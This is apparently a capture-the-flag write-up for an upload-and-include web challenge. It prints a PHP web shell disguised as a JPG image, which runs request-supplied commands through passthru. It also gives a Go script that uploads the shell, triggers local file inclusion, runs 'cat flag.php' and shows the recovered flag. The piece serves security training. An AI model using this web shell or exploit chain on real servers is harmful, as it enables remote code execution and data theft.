There are two vulnerabilities we can exploit:

* we can upload an image file with php embedded in it
* we can make the server include our image file and execute our code

We can get php shellcode online, I found this:

```php
root@14a2c8b9938e:/pwd/lfi# cat shell.php.jpg
����
<form action="" method="get">
Command: <input type="text" name="cmd" /><input type="submit" value="Exec" />
</form>
Output:<br />
<pre><?php passthru($_REQUEST['cmd'], $result); ?></pre>
```

Then we can write code to automate the entire process:

```go
func main() {
	imageURL := upload("./shell.php.jpg")
	if imageURL == "" {
		log.Fatalln("Failed to upload exploit!")
    }
    // http://lfi.hax1.allesctf.net:8081/index.php?site=view.php&image=uploads/55057da5bf3462877b44943b9c507ee3.jpg
	fmt.Println(base + "/" + imageURL)
    parts := strings.Split(imageURL, "=")
    
    // http://lfi.hax1.allesctf.net:8081/index.php?site=uploads/55057da5bf3462877b44943b9c507ee3.jpg&cmd=cat+flag.php+%7C+base64
	target := base + "/" + parts[0] + "=" + parts[len(parts)-1] + "&cmd=" + url.QueryEscape("cat flag.php | base64")
	fmt.Println(target)
	rsp, err := http.Get(target)
	checkErr(err)
	fmt.Println(rsp.StatusCode)

	flag, err := base64.StdEncoding.DecodeString(strings.ReplaceAll(pre.FindString(resStr(rsp)), "<pre>", ""))
	checkErr(err)
	fmt.Println(string(flag))
}
```

```console
root@14a2c8b9938e:/pwd/lfi# go run .
[...]
$FLAG = "CSCG{G3tting_RCE_0n_w3b_is_alw4ys_cool}";
```